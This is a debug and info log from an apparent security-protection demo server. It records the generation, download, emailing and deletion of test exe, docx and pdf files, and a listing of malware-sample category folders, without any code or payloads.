2025-01-16 21:50:24 - DEBUG - delete_all_generated_files:604 - Database connection closed after delete_all_generated_files.
2025-01-16 21:50:24 - INFO - delete_all_generated_files:613 - File 'generated_exe_32bit_file_1096.exe' deleted from filesystem.
2025-01-16 21:50:24 - INFO - delete_all_files:327 - Deleted all generated files.
2025-01-16 21:50:24 - INFO - load_generated_files:473 - Loading all generated files from the database.
2025-01-16 21:50:24 - DEBUG - load_generated_files:499 - Fetched 0 records from 'generated_files' table.
2025-01-16 21:50:24 - DEBUG - load_generated_files:502 - Database connection closed after load_generated_files.
2025-01-16 21:50:28 - INFO - save_generated_file_to_db:438 - Saving generated file to database: generated_exe_32bit_file_6460.exe
2025-01-16 21:50:28 - INFO - save_generated_file_to_db:455 - Generated file 'generated_exe_32bit_file_6460.exe' saved successfully.
2025-01-16 21:50:28 - DEBUG - save_generated_file_to_db:462 - Database connection closed after save_generated_file_to_db.
2025-01-16 21:50:28 - INFO - generate:425 - File of type 'exe' generated successfully.
2025-01-16 21:50:28 - INFO - load_generated_files:473 - Loading all generated files from the database.
2025-01-16 21:50:28 - DEBUG - load_generated_files:499 - Fetched 1 records from 'generated_files' table.
2025-01-16 21:50:28 - DEBUG - load_generated_files:502 - Database connection closed after load_generated_files.
2025-01-16 21:50:30 - INFO - download_file:465 - Serving file for download: /home/kali/Desktop/cp_demo_server/app/data/generated_files/generated_exe_32bit_file_6460.exe with MIME type: application/x-msdownload
2025-01-16 21:51:34 - INFO - delete_all_generated_files:590 - Attempting to delete all generated files.
2025-01-16 21:51:34 - INFO - delete_all_generated_files:597 - All files deleted from database.
2025-01-16 21:51:34 - DEBUG - delete_all_generated_files:604 - Database connection closed after delete_all_generated_files.
2025-01-16 21:51:34 - INFO - delete_all_generated_files:613 - File 'generated_exe_32bit_file_6460.exe' deleted from filesystem.
2025-01-16 21:51:34 - INFO - delete_all_files:327 - Deleted all generated files.
2025-01-16 21:51:34 - INFO - load_generated_files:473 - Loading all generated files from the database.
2025-01-16 21:51:34 - DEBUG - load_generated_files:499 - Fetched 0 records from 'generated_files' table.
2025-01-16 21:51:34 - DEBUG - load_generated_files:502 - Database connection closed after load_generated_files.
2025-01-16 21:51:42 - INFO - save_generated_file_to_db:438 - Saving generated file to database: generated_exe_32bit_file_6133.exe
2025-01-16 21:51:42 - INFO - save_generated_file_to_db:455 - Generated file 'generated_exe_32bit_file_6133.exe' saved successfully.
2025-01-16 21:51:42 - DEBUG - save_generated_file_to_db:462 - Database connection closed after save_generated_file_to_db.
2025-01-16 21:51:42 - INFO - generate:425 - File of type 'exe' generated successfully.
2025-01-16 21:51:42 - INFO - load_generated_files:473 - Loading all generated files from the database.
2025-01-16 21:51:42 - DEBUG - load_generated_files:499 - Fetched 1 records from 'generated_files' table.
2025-01-16 21:51:42 - DEBUG - load_generated_files:502 - Database connection closed after load_generated_files.
2025-01-16 21:51:43 - INFO - download_file:465 - Serving file for download: /home/kali/Desktop/cp_demo_server/app/data/generated_files/generated_exe_32bit_file_6133.exe with MIME type: application/x-msdownload
2025-01-16 21:51:59 - INFO - delete_generated_file:557 - Attempting to delete generated file: generated_exe_32bit_file_6133.exe
2025-01-16 21:51:59 - INFO - delete_generated_file:564 - File 'generated_exe_32bit_file_6133.exe' deleted from database.
2025-01-16 21:51:59 - DEBUG - delete_generated_file:571 - Database connection closed after delete_generated_file.
2025-01-16 21:51:59 - INFO - delete_generated_file:578 - File 'generated_exe_32bit_file_6133.exe' deleted from filesystem.
2025-01-16 21:51:59 - INFO - delete_file:297 - Deleted file: generated_exe_32bit_file_6133.exe
2025-01-16 21:51:59 - INFO - load_generated_files:473 - Loading all generated files from the database.
2025-01-16 21:51:59 - DEBUG - load_generated_files:499 - Fetched 0 records from 'generated_files' table.
2025-01-16 21:51:59 - DEBUG - load_generated_files:502 - Database connection closed after load_generated_files.
2025-01-16 23:24:10 - INFO - init_db:58 - Initializing protections database.
2025-01-16 23:24:10 - DEBUG - init_db:64 - Dropping existing 'protections' table if it exists.
2025-01-16 23:24:10 - DEBUG - init_db:68 - Creating 'protections' table.
2025-01-16 23:24:10 - INFO - init_db:86 - 'protections' table created successfully.
2025-01-16 23:24:10 - DEBUG - init_db:93 - Database connection closed after init_db.
2025-01-16 23:24:10 - INFO - init_db_for_generated_files:103 - Initializing generated_files database.
2025-01-16 23:24:10 - DEBUG - init_db_for_generated_files:109 - Dropping existing 'generated_files' table if it exists.
2025-01-16 23:24:10 - DEBUG - init_db_for_generated_files:113 - Creating 'generated_files' table.
2025-01-16 23:24:10 - INFO - init_db_for_generated_files:133 - 'generated_files' table created successfully.
2025-01-16 23:24:10 - DEBUG - init_db_for_generated_files:140 - Database connection closed after init_db_for_generated_files.
2025-01-16 23:24:10 - INFO - load_csv_to_db:259 - Starting to load CSV data into protections database.
2025-01-16 23:24:10 - WARNING - load_csv_to_db:276 - Skipping row 10: Missing ProtectionName or Resource.
2025-01-16 23:24:10 - WARNING - load_csv_to_db:276 - Skipping row 16: Missing ProtectionName or Resource.
2025-01-16 23:24:10 - INFO - load_csv_to_db:311 - CSV data loaded successfully into protections database.
2025-01-16 23:24:10 - DEBUG - load_csv_to_db:317 - Database connection closed after load_csv_to_db.
2025-01-16 23:27:43 - INFO - load_generated_files:473 - Loading all generated files from the database.
2025-01-16 23:27:43 - DEBUG - load_generated_files:499 - Fetched 0 records from 'generated_files' table.
2025-01-16 23:27:43 - DEBUG - load_generated_files:502 - Database connection closed after load_generated_files.
2025-01-16 23:29:21 - INFO - save_generated_file_to_db:438 - Saving generated file to database: generated_pdf_file_2701.pdf
2025-01-16 23:29:21 - INFO - save_generated_file_to_db:455 - Generated file 'generated_pdf_file_2701.pdf' saved successfully.
2025-01-16 23:29:21 - DEBUG - save_generated_file_to_db:462 - Database connection closed after save_generated_file_to_db.
2025-01-16 23:29:21 - INFO - generate:425 - File of type 'pdf' generated successfully.
2025-01-16 23:29:21 - INFO - load_generated_files:473 - Loading all generated files from the database.
2025-01-16 23:29:21 - DEBUG - load_generated_files:499 - Fetched 1 records from 'generated_files' table.
2025-01-16 23:29:21 - DEBUG - load_generated_files:502 - Database connection closed after load_generated_files.
2025-01-16 23:29:25 - INFO - send_email_route:641 - Email sent successfully to cpadmin@americas-ses.com.
2025-01-16 23:29:25 - INFO - load_generated_files:473 - Loading all generated files from the database.
2025-01-16 23:29:25 - DEBUG - load_generated_files:499 - Fetched 1 records from 'generated_files' table.
2025-01-16 23:29:25 - DEBUG - load_generated_files:502 - Database connection closed after load_generated_files.
2025-01-16 23:29:38 - INFO - load_generated_files:473 - Loading all generated files from the database.
2025-01-16 23:29:38 - DEBUG - load_generated_files:499 - Fetched 1 records from 'generated_files' table.
2025-01-16 23:29:38 - DEBUG - load_generated_files:502 - Database connection closed after load_generated_files.
2025-01-16 23:29:46 - INFO - send_email_route:641 - Email sent successfully to cpadmin@americas-ses.com.
2025-01-16 23:29:46 - INFO - load_generated_files:473 - Loading all generated files from the database.
2025-01-16 23:29:46 - DEBUG - load_generated_files:499 - Fetched 1 records from 'generated_files' table.
2025-01-16 23:29:46 - DEBUG - load_generated_files:502 - Database connection closed after load_generated_files.
2025-01-16 23:30:01 - INFO - delete_all_generated_files:590 - Attempting to delete all generated files.
2025-01-16 23:30:01 - INFO - delete_all_generated_files:597 - All files deleted from database.
2025-01-16 23:30:01 - DEBUG - delete_all_generated_files:604 - Database connection closed after delete_all_generated_files.
2025-01-16 23:30:01 - INFO - delete_all_generated_files:613 - File 'generated_pdf_file_2701.pdf' deleted from filesystem.
2025-01-16 23:30:01 - INFO - delete_all_files:327 - Deleted all generated files.
2025-01-16 23:30:01 - INFO - load_generated_files:473 - Loading all generated files from the database.
2025-01-16 23:30:01 - DEBUG - load_generated_files:499 - Fetched 0 records from 'generated_files' table.
2025-01-16 23:30:01 - DEBUG - load_generated_files:502 - Database connection closed after load_generated_files.
2025-01-16 23:30:50 - INFO - load_generated_files:473 - Loading all generated files from the database.
2025-01-16 23:30:50 - DEBUG - load_generated_files:499 - Fetched 0 records from 'generated_files' table.
2025-01-16 23:30:50 - DEBUG - load_generated_files:502 - Database connection closed after load_generated_files.
2025-01-16 23:31:04 - INFO - load_generated_files:473 - Loading all generated files from the database.
2025-01-16 23:31:04 - DEBUG - load_generated_files:499 - Fetched 0 records from 'generated_files' table.
2025-01-16 23:31:04 - DEBUG - load_generated_files:502 - Database connection closed after load_generated_files.
2025-01-16 23:31:08 - INFO - save_generated_file_to_db:438 - Saving generated file to database: generated_pdf_file_3688.pdf
2025-01-16 23:31:08 - INFO - save_generated_file_to_db:455 - Generated file 'generated_pdf_file_3688.pdf' saved successfully.
2025-01-16 23:31:08 - DEBUG - save_generated_file_to_db:462 - Database connection closed after save_generated_file_to_db.
2025-01-16 23:31:08 - INFO - generate:425 - File of type 'pdf' generated successfully.
2025-01-16 23:31:08 - INFO - load_generated_files:473 - Loading all generated files from the database.
2025-01-16 23:31:08 - DEBUG - load_generated_files:499 - Fetched 1 records from 'generated_files' table.
2025-01-16 23:31:08 - DEBUG - load_generated_files:502 - Database connection closed after load_generated_files.
2025-01-16 23:31:12 - INFO - send_email_route:641 - Email sent successfully to cpadmin@americas-ses.com.
2025-01-16 23:31:12 - INFO - load_generated_files:473 - Loading all generated files from the database.
2025-01-16 23:31:12 - DEBUG - load_generated_files:499 - Fetched 1 records from 'generated_files' table.
2025-01-16 23:31:12 - DEBUG - load_generated_files:502 - Database connection closed after load_generated_files.
2025-01-16 23:31:14 - INFO - delete_all_generated_files:590 - Attempting to delete all generated files.
2025-01-16 23:31:14 - INFO - delete_all_generated_files:597 - All files deleted from database.
2025-01-16 23:31:14 - DEBUG - delete_all_generated_files:604 - Database connection closed after delete_all_generated_files.
2025-01-16 23:31:14 - INFO - delete_all_generated_files:613 - File 'generated_pdf_file_3688.pdf' deleted from filesystem.
2025-01-16 23:31:14 - INFO - delete_all_files:327 - Deleted all generated files.
2025-01-16 23:31:14 - INFO - load_generated_files:473 - Loading all generated files from the database.
2025-01-16 23:31:14 - DEBUG - load_generated_files:499 - Fetched 0 records from 'generated_files' table.
2025-01-16 23:31:14 - DEBUG - load_generated_files:502 - Database connection closed after load_generated_files.
2025-01-21 13:41:53 - INFO - load_protections:334 - Loading all protections from the database.
2025-01-21 13:41:53 - DEBUG - load_protections:346 - Fetched 41 records from 'protections' table.
2025-01-21 13:41:53 - DEBUG - load_protections:349 - Database connection closed after load_protections.
2025-01-21 13:41:54 - INFO - dir_listing:234 - Resolved absolute path: /home/kali/Desktop/cp_demo_server/app/data/malware_samples
2025-01-21 13:41:54 - DEBUG - dir_listing:263 - Files and directories: [{'name': 'Trojan', 'path': 'Trojan', 'is_file': False}, {'name': 'RAT', 'path': 'RAT', 'is_file': False}, {'name': 'eicar', 'path': 'eicar', 'is_file': False}, {'name': 'Virus', 'path': 'Virus', 'is_file': False}, {'name': 'Spyware', 'path': 'Spyware', 'is_file': False}, {'name': 'Worm', 'path': 'Worm', 'is_file': False}, {'name': 'Banking-Malware', 'path': 'Banking-Malware', 'is_file': False}, {'name': 'Joke', 'path': 'Joke', 'is_file': False}, {'name': 'Stealer', 'path': 'Stealer', 'is_file': False}, {'name': 'rogues', 'path': 'rogues', 'is_file': False}, {'name': 'Pony', 'path': 'Pony', 'is_file': False}, {'name': 'Net-Worm', 'path': 'Net-Worm', 'is_file': False}, {'name': 'Email-Worm', 'path': 'Email-Worm', 'is_file': False}, {'name': 'Ransomware', 'path': 'Ransomware', 'is_file': False}]
2025-01-21 13:41:55 - INFO - load_generated_files:473 - Loading all generated files from the database.
2025-01-21 13:41:55 - DEBUG - load_generated_files:499 - Fetched 0 records from 'generated_files' table.
2025-01-21 13:41:55 - DEBUG - load_generated_files:502 - Database connection closed after load_generated_files.
2025-01-21 13:42:48 - INFO - load_generated_files:473 - Loading all generated files from the database.
2025-01-21 13:42:48 - DEBUG - load_generated_files:499 - Fetched 0 records from 'generated_files' table.
2025-01-21 13:42:48 - DEBUG - load_generated_files:502 - Database connection closed after load_generated_files.
2025-01-21 13:42:52 - INFO - save_generated_file_to_db:438 - Saving generated file to database: generated_docx_file_9297.docx
2025-01-21 13:42:52 - INFO - save_generated_file_to_db:455 - Generated file 'generated_docx_file_9297.docx' saved successfully.
2025-01-21 13:42:52 - DEBUG - save_generated_file_to_db:462 - Database connection closed after save_generated_file_to_db.
2025-01-21 13:42:52 - INFO - generate:425 - File of type 'docx' generated successfully.
2025-01-21 13:42:52 - INFO - load_generated_files:473 - Loading all generated files from the database.
2025-01-21 13:42:52 - DEBUG - load_generated_files:499 - Fetched 1 records from 'generated_files' table.
2025-01-21 13:42:52 - DEBUG - load_generated_files:502 - Database connection closed after load_generated_files.
2025-01-21 13:43:00 - INFO - download_file:465 - Serving file for download: /home/kali/Desktop/cp_demo_server/app/data/generated_files/generated_docx_file_9297.docx with MIME type: application/vnd.openxmlformats-officedocument.wordprocessingml.document
2025-01-21 14:16:59 - INFO - send_email_route:641 - Email sent successfully to cpadmin@americas-ses.com.
2025-01-21 14:16:59 - INFO - load_generated_files:473 - Loading all generated files from the database.
2025-01-21 14:16:59 - DEBUG - load_generated_files:499 - Fetched 1 records from 'generated_files' table.
2025-01-21 14:16:59 - DEBUG - load_generated_files:502 - Database connection closed after load_generated_files.
2025-01-21 14:19:14 - INFO - load_generated_files:473 - Loading all generated files from the database.
2025-01-21 14:19:14 - DEBUG - load_generated_files:499 - Fetched 1 records from 'generated_files' table.
2025-01-21 14:19:14 - DEBUG - load_generated_files:502 - Database connection closed after load_generated_files.
2025-01-21 14:19:18 - INFO - send_email_route:641 - Email sent successfully to cpadmin@americas-ses.com.
2025-01-21 14:19:18 - INFO - load_generated_files:473 - Loading all generated files from the database.
2025-01-21 14:19:18 - DEBUG - load_generated_files:499 - Fetched 1 records from 'generated_files' table.
2025-01-21 14:19:18 - DEBUG - load_generated_files:502 - Database connection closed after load_generated_files.
2025-01-21 14:27:42 - INFO - delete_all_generated_files:590 - Attempting to delete all generated files.
2025-01-21 14:27:42 - INFO - delete_all_generated_files:597 - All files deleted from database.
2025-01-21 14:27:42 - DEBUG - delete_all_generated_files:604 - Database connection closed after delete_all_generated_files.
2025-01-21 14:27:42 - INFO - delete_all_generated_files:613 - File 'generated_docx_file_9297.docx' deleted from filesystem.
2025-01-21 14:27:42 - INFO - delete_all_files:327 - Deleted all generated files.
2025-01-21 14:27:42 - INFO - load_generated_files:473 - Loading all generated files from the database.
2025-01-21 14:27:42 - DEBUG - load_generated_files:499 - Fetched 0 records from 'generated_files' table.
2025-01-21 14:27:42 - DEBUG - load_generated_files:502 - Database connection closed after load_generated_files.
2025-01-21 14:28:11 - INFO - save_generated_file_to_db:438 - Saving generated file to database: generated_exe_32bit_file_6042.exe
2025-01-21 14:28:11 - INFO - save_generated_file_to_db:455 - Generated file 'generated_exe_32bit_file_6042.exe' saved successfully.
2025-01-21 14:28:11 - DEBUG - save_generated_file_to_db:462 - Database connection closed after save_generated_file_to_db.
2025-01-21 14:28:11 - INFO - generate:425 - File of type 'exe' generated successfully.
2025-01-21 14:28:11 - INFO - load_generated_files:473 - Loading all generated files from the database.
2025-01-21 14:28:11 - DEBUG - load_generated_files:499 - Fetched 1 records from 'generated_files' table.
2025-01-21 14:28:11 - DEBUG - load_generated_files:502 - Database connection closed after load_generated_files.
2025-01-21 14:28:36 - INFO - download_file:465 - Serving file for download: /home/kali/Desktop/cp_demo_server/app/data/generated_files/generated_exe_32bit_file_6042.exe with MIME type: application/x-msdownload
2025-01-21 15:14:41 - INFO - download_file:465 - Serving file for download: /home/kali/Desktop/cp_demo_server/app/data/generated_files/generated_exe_32bit_file_6042.exe with MIME type: application/x-msdownload
2025-01-21 15:14:56 - INFO - delete_generated_file:557 - Attempting to delete generated file: generated_exe_32bit_file_6042.exe
2025-01-21 15:14:56 - INFO - delete_generated_file:564 - File 'generated_exe_32bit_file_6042.exe' deleted from database.
2025-01-21 15:14:56 - DEBUG - delete_generated_file:571 - Database connection closed after delete_generated_file.
2025-01-21 15:14:56 - INFO - delete_generated_file:578 - File 'generated_exe_32bit_file_6042.exe' deleted from filesystem.
2025-01-21 15:14:56 - INFO - delete_file:297 - Deleted file: generated_exe_32bit_file_6042.exe
2025-01-21 15:14:56 - INFO - load_generated_files:473 - Loading all generated files from the database.
2025-01-21 15:14:56 - DEBUG - load_generated_files:499 - Fetched 0 records from 'generated_files' table.
2025-01-21 15:14:56 - DEBUG - load_generated_files:502 - Database connection closed after load_generated_files.
2025-01-21 15:15:02 - INFO - save_generated_file_to_db:438 - Saving generated file to database: generated_exe_32bit_file_2920.exe
2025-01-21 15:15:02 - INFO - save_generated_file_to_db:455 - Generated file 'generated_exe_32bit_file_2920.exe' saved successfully.
2025-01-21 15:15:02 - DEBUG - save_generated_file_to_db:462 - Database connection closed after save_generated_file_to_db.
2025-01-21 15:15:02 - INFO - generate:425 - File of type 'exe' generated successfully.
2025-01-21 15:15:02 - INFO - load_generated_files:473 - Loading all generated files from the database.
2025-01-21 15:15:02 - DEBUG - load_generated_files:499 - Fetched 1 records from 'generated_files' table.
2025-01-21 15:15:02 - DEBUG - load_generated_files:502 - Database connection closed after load_generated_files.
2025-01-21 15:31:36 - INFO - download_file:465 - Serving file for download: /home/kali/Desktop/cp_demo_server/app/data/generated_files/generated_exe_32bit_file_2920.exe with MIME type: application/x-msdownload
2025-01-21 15:39:04 - INFO - delete_all_generated_files:590 - Attempting to delete all generated files.
2025-01-21 15:39:04 - INFO - delete_all_generated_files:597 - All files deleted from database.
2025-01-21 15:39:04 - DEBUG - delete_all_generated_files:604 - Database connection closed after delete_all_generated_files.
2025-01-21 15:39:04 - INFO - delete_all_generated_files:613 - File 'generated_exe_32bit_file_2920.exe' deleted from filesystem.
2025-01-21 15:39:04 - INFO - delete_all_files:327 - Deleted all generated files.
2025-01-21 15:39:04 - INFO - load_generated_files:473 - Loading all generated files from the database.
2025-01-21 15:39:04 - DEBUG - load_generated_files:499 - Fetched 0 records from 'generated_files' table.
2025-01-21 15:39:04 - DEBUG - load_generated_files:502 - Database connection closed after load_generated_files.
2025-01-21 15:39:09 - INFO - save_generated_file_to_db:438 - Saving generated file to database: generated_exe_64bit_file_6759.exe
2025-01-21 15:39:09 - INFO - save_generated_file_to_db:455 - Generated file 'generated_exe_64bit_file_6759.exe' saved successfully.
2025-01-21 15:39:09 - DEBUG - save_generated_file_to_db:462 - Database connection closed after save_generated_file_to_db.
2025-01-21 15:39:09 - INFO - generate:425 - File of type 'exe-64bit' generated successfully.
2025-01-21 15:39:09 - INFO - load_generated_files:473 - Loading all generated files from the database.
2025-01-21 15:39:09 - DEBUG - load_generated_files:499 - Fetched 1 records from 'generated_files' table.
2025-01-21 15:39:09 - DEBUG - load_generated_files:502 - Database connection closed after load_generated_files.
2025-01-21 15:39:54 - INFO - download_file:465 - Serving file for download: /home/kali/Desktop/cp_demo_server/app/data/generated_files/generated_exe_64bit_file_6759.exe with MIME type: application/x-msdownload
2025-01-21 18:39:24 - INFO - delete_generated_file:557 - Attempting to delete generated file: generated_exe_64bit_file_6759.exe
2025-01-21 18:39:24 - INFO - delete_generated_file:564 - File 'generated_exe_64bit_file_6759.exe' deleted from database.
2025-01-21 18:39:24 - DEBUG - delete_generated_file:571 - Database connection closed after delete_generated_file.
2025-01-21 18:39:24 - INFO - delete_generated_file:578 - File 'generated_exe_64bit_file_6759.exe' deleted from filesystem.
2025-01-21 18:39:24 - INFO - delete_file:297 - Deleted file: generated_exe_64bit_file_6759.exe
2025-01-21 18:39:24 - INFO - load_generated_files:473 - Loading all generated files from the database.
2025-01-21 18:39:24 - DEBUG - load_generated_files:499 - Fetched 0 records from 'generated_files' table.
2025-01-21 18:39:24 - DEBUG - load_generated_files:502 - Database connection closed after load_generated_files.
2025-01-21 18:39:55 - INFO - save_generated_file_to_db:438 - Saving generated file to database: generated_docx_file_2132.docx
2025-01-21 18:39:55 - INFO - save_generated_file_to_db:455 - Generated file 'generated_docx_file_2132.docx' saved successfully.
2025-01-21 18:39:55 - DEBUG - save_generated_file_to_db:462 - Database connection closed after save_generated_file_to_db.
2025-01-21 18:39:55 - INFO - generate:425 - File of type 'docx' generated successfully.
2025-01-21 18:39:55 - INFO - load_generated_files:473 - Loading all generated files from the database.
2025-01-21 18:39:55 - DEBUG - load_generated_files:499 - Fetched 1 records from 'generated_files' table.
2025-01-21 18:39:55 - DEBUG - load_generated_files:502 - Database connection closed after load_generated_files.
2025-01-21 18:42:08 - INFO - download_file:465 - Serving file for download: /home/kali/Desktop/cp_demo_server/app/data/generated_files/generated_docx_file_2132.docx with MIME type: application/vnd.openxmlformats-officedocument.wordprocessingml.document
2025-01-21 20:05:23 - INFO - delete_all_generated_files:590 - Attempting to delete all generated files.
2025-01-21 20:05:23 - INFO - delete_all_generated_files:597 - All files deleted from database.
2025-01-21 20:05:23 - DEBUG - delete_all_generated_files:604 - Database connection closed after delete_all_generated_files.
2025-01-21 20:05:23 - INFO - delete_all_generated_files:613 - File 'generated_docx_file_2132.docx' deleted from filesystem.
2025-01-21 20:05:23 - INFO - delete_all_generated_files:613 - File 'generated_jpg_file_5978.jpg' deleted from filesystem.
2025-01-21 20:05:23 - INFO - delete_all_files:327 - Deleted all generated files.
2025-01-21 20:05:23 - INFO - load_generated_files:473 - Loading all generated files from the database.
2025-01-21 20:05:23 - DEBUG - load_generated_files:499 - Fetched 0 records from 'generated_files' table.
2025-01-21 20:05:23 - DEBUG - load_generated_files:502 - Database connection closed after load_generated_files.
2025-01-21 20:05:28 - INFO - save_generated_file_to_db:438 - Saving generated file to database: generated_docx_file_8130.docx
2025-01-21 20:05:28 - INFO - save_generated_file_to_db:455 - Generated file 'generated_docx_file_8130.docx' saved successfully.
2025-01-21 20:05:28 - DEBUG - save_generated_file_to_db:462 - Database connection closed after save_generated_file_to_db.
2025-01-21 20:05:28 - INFO - generate:425 - File of type 'docx' generated successfully.
2025-01-21 20:05:28 - INFO - load_generated_files:473 - Loading all generated files from the database.
2025-01-21 20:05:28 - DEBUG - load_generated_files:499 - Fetched 1 records from 'generated_files' table.
2025-01-21 20:05:28 - DEBUG - load_generated_files:502 - Database connection closed after load_generated_files.
2025-01-21 20:05:31 - INFO - download_file:465 - Serving file for download: /home/kali/Desktop/cp_demo_server/app/data/generated_files/generated_docx_file_8130.docx with MIME type: application/vnd.openxmlformats-officedocument.wordprocessingml.document
2025-01-21 20:38:56 - INFO - delete_generated_file:557 - Attempting to delete generated file: generated_docx_file_8130.docx
2025-01-21 20:38:56 - INFO - delete_generated_file:564 - File 'generated_docx_file_8130.docx' deleted from database.
2025-01-21 20:38:56 - DEBUG - delete_generated_file:571 - Database connection closed after delete_generated_file.
2025-01-21 20:38:56 - INFO - delete_generated_file:578 - File 'generated_docx_file_8130.docx' deleted from filesystem.
2025-01-21 20:38:56 - INFO - delete_file:297 - Deleted file: generated_docx_file_8130.docx
2025-01-21 20:38:56 - INFO - load_generated_files:473 - Loading all generated files from the database.
2025-01-21 20:38:56 - DEBUG - load_generated_files:499 - Fetched 0 records from 'generated_files' table.
2025-01-21 20:38:56 - DEBUG - load_generated_files:502 - Database connection closed after load_generated_files.
2025-01-21 20:39:24 - INFO - save_generated_file_to_db:438 - Saving generated file to database: generated_docx_file_7205.docx
2025-01-21 20:39:24 - INFO - save_generated_file_to_db:455 - Generated file 'generated_docx_file_7205.docx' saved successfully.
2025-01-21 20:39:24 - DEBUG - save_generated_file_to_db:462 - Database connection closed after save_generated_file_to_db.
2025-01-21 20:39:24 - INFO - generate:425 - File of type 'docx' generated successfully.
2025-01-21 20:39:24 - INFO - load_generated_files:473 - Loading all generated files from the database.
2025-01-21 20:39:24 - DEBUG - load_generated_files:499 - Fetched 1 records from 'generated_files' table.
2025-01-21 20:39:24 - DEBUG - load_generated_files:502 - Database connection closed after load_generated_files.
2025-01-21 20:39:28 - INFO - download_file:465 - Serving file for download: /home/kali/Desktop/cp_demo_server/app/data/generated_files/generated_docx_file_7205.docx with MIME type: application/vnd.openxmlformats-officedocument.wordprocessingml.document
2025-01-21 20:46:51 - INFO - delete_generated_file:557 - Attempting to delete generated file: generated_docx_file_7205.docx
2025-01-21 20:46:51 - INFO - delete_generated_file:564 - File 'generated_docx_file_7205.docx' deleted from database.
2025-01-21 20:46:51 - DEBUG - delete_generated_file:571 - Database connection closed after delete_generated_file.
2025-01-21 20:46:51 - INFO - delete_generated_file:578 - File 'generated_docx_file_7205.docx' deleted from filesystem.
2025-01-21 20:46:51 - INFO - delete_file:297 - Deleted file: generated_docx_file_7205.docx
2025-01-21 20:46:51 - INFO - load_generated_files:473 - Loading all generated files from the database.
2025-01-21 20:46:51 - DEBUG - load_generated_files:499 - Fetched 0 records from 'generated_files' table.
2025-01-21 20:46:51 - DEBUG - load_generated_files:502 - Database connection closed after load_generated_files.
2025-01-21 20:52:32 - INFO - save_generated_file_to_db:438 - Saving generated file to database: generated_pdf_file_7874.pdf
2025-01-21 20:52:32 - INFO - save_generated_file_to_db:455 - Generated file 'generated_pdf_file_7874.pdf' saved successfully.
2025-01-21 20:52:32 - DEBUG - save_generated_file_to_db:462 - Database connection closed after save_generated_file_to_db.
2025-01-21 20:52:32 - INFO - generate:425 - File of type 'pdf' generated successfully.
2025-01-21 20:52:32 - INFO - load_generated_files:473 - Loading all generated files from the database.
2025-01-21 20:52:32 - DEBUG - load_generated_files:499 - Fetched 1 records from 'generated_files' table.
2025-01-21 20:52:32 - DEBUG - load_generated_files:502 - Database connection closed after load_generated_files.
2025-01-21 20:52:34 - INFO - download_file:465 - Serving file for download: /home/kali/Desktop/cp_demo_server/app/data/generated_files/generated_pdf_file_7874.pdf with MIME type: application/pdf
2025-01-21 20:54:41 - INFO - load_generated_files:473 - Loading all generated files from the database.
2025-01-21 20:54:41 - DEBUG - load_generated_files:499 - Fetched 1 records from 'generated_files' table.
2025-01-21 20:54:41 - DEBUG - load_generated_files:502 - Database connection closed after load_generated_files.
2025-01-21 20:54:46 - INFO - send_email_route:641 - Email sent successfully to cpadmin@americas-ses.com.
2025-01-21 20:54:46 - INFO - load_generated_files:473 - Loading all generated files from the database.
2025-01-21 20:54:46 - DEBUG - load_generated_files:499 - Fetched 1 records from 'generated_files' table.
2025-01-21 20:54:46 - DEBUG - load_generated_files:502 - Database connection closed after load_generated_files.
2025-01-21 20:55:42 - INFO - delete_all_generated_files:590 - Attempting to delete all generated files.
2025-01-21 20:55:42 - INFO - delete_all_generated_files:597 - All files deleted from database.
2025-01-21 20:55:42 - DEBUG - delete_all_generated_files:604 - Database connection closed after delete_all_generated_files.
2025-01-21 20:55:42 - INFO - delete_all_generated_files:613 - File 'generated_pdf_file_7874.pdf' deleted from filesystem.
2025-01-21 20:55:42 - INFO - delete_all_generated_files:613 - File 'generated_jpg_file_9905.jpg' deleted from filesystem.
2025-01-21 20:55:42 - INFO - delete_all_files:327 - Deleted all generated files.
2025-01-21 20:55:42 - INFO - load_generated_files:473 - Loading all generated files from the database.
2025-01-21 20:55:42 - DEBUG - load_generated_files:499 - Fetched 0 records from 'generated_files' table.
2025-01-21 20:55:42 - DEBUG - load_generated_files:502 - Database connection closed after load_generated_files.
2025-01-21 20:55:57 - INFO - save_generated_file_to_db:438 - Saving generated file to database: generated_pdf_file_2161.pdf
2025-01-21 20:55:57 - INFO - save_generated_file_to_db:455 - Generated file 'generated_pdf_file_2161.pdf' saved successfully.
2025-01-21 20:55:57 - DEBUG - save_generated_file_to_db:462 - Database connection closed after save_generated_file_to_db.
2025-01-21 20:55:57 - INFO - generate:425 - File of type 'pdf' generated successfully.
2025-01-21 20:55:57 - INFO - load_generated_files:473 - Loading all generated files from the database.
2025-01-21 20:55:57 - DEBUG - load_generated_files:499 - Fetched 1 records from 'generated_files' table.
2025-01-21 20:55:57 - DEBUG - load_generated_files:502 - Database connection closed after load_generated_files.
2025-01-21 20:55:59 - INFO - download_file:465 - Serving file for download: /home/kali/Desktop/cp_demo_server/app/data/generated_files/generated_pdf_file_2161.pdf with MIME type: application/pdf
2025-01-21 20:56:58 - INFO - delete_all_generated_files:590 - Attempting to delete all generated files.
2025-01-21 20:56:58 - INFO - delete_all_generated_files:597 - All files deleted from database.
2025-01-21 20:56:58 - DEBUG - delete_all_generated_files:604 - Database connection closed after delete_all_generated_files.
2025-01-21 20:56:58 - INFO - delete_all_generated_files:613 - File 'generated_pdf_file_2161.pdf' deleted from filesystem.
2025-01-21 20:56:58 - INFO - delete_all_files:327 - Deleted all generated files.
2025-01-21 20:56:58 - INFO - load_generated_files:473 - Loading all generated files from the database.
2025-01-21 20:56:58 - DEBUG - load_generated_files:499 - Fetched 0 records from 'generated_files' table.
2025-01-21 20:56:58 - DEBUG - load_generated_files:502 - Database connection closed after load_generated_files.
2025-01-21 20:57:07 - INFO - save_generated_file_to_db:438 - Saving generated file to database: generated_pdf_file_2382.pdf
2025-01-21 20:57:07 - INFO - save_generated_file_to_db:455 - Generated file 'generated_pdf_file_2382.pdf' saved successfully.
2025-01-21 20:57:07 - DEBUG - save_generated_file_to_db:462 - Database connection closed after save_generated_file_to_db.
2025-01-21 20:57:07 - INFO - generate:425 - File of type 'pdf' generated successfully.
2025-01-21 20:57:07 - INFO - load_generated_files:473 - Loading all generated files from the database.
2025-01-21 20:57:07 - DEBUG - load_generated_files:499 - Fetched 1 records from 'generated_files' table.
2025-01-21 20:57:07 - DEBUG - load_generated_files:502 - Database connection closed after load_generated_files.
2025-01-21 20:57:09 - INFO - download_file:465 - Serving file for download: /home/kali/Desktop/cp_demo_server/app/data/generated_files/generated_pdf_file_2382.pdf with MIME type: application/pdf
2025-01-21 20:57:48 - INFO - load_generated_files:473 - Loading all generated files from the database.
